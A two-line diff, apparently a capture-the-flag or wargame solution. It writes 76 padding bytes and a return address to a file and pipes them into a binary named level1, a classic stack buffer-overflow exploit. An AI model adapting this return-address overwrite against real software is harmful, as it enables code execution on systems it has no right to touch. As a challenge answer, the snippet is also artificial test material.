@@ -1,0 +1,2 @@
+python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/file
+cat /tmp/file - | ./level1
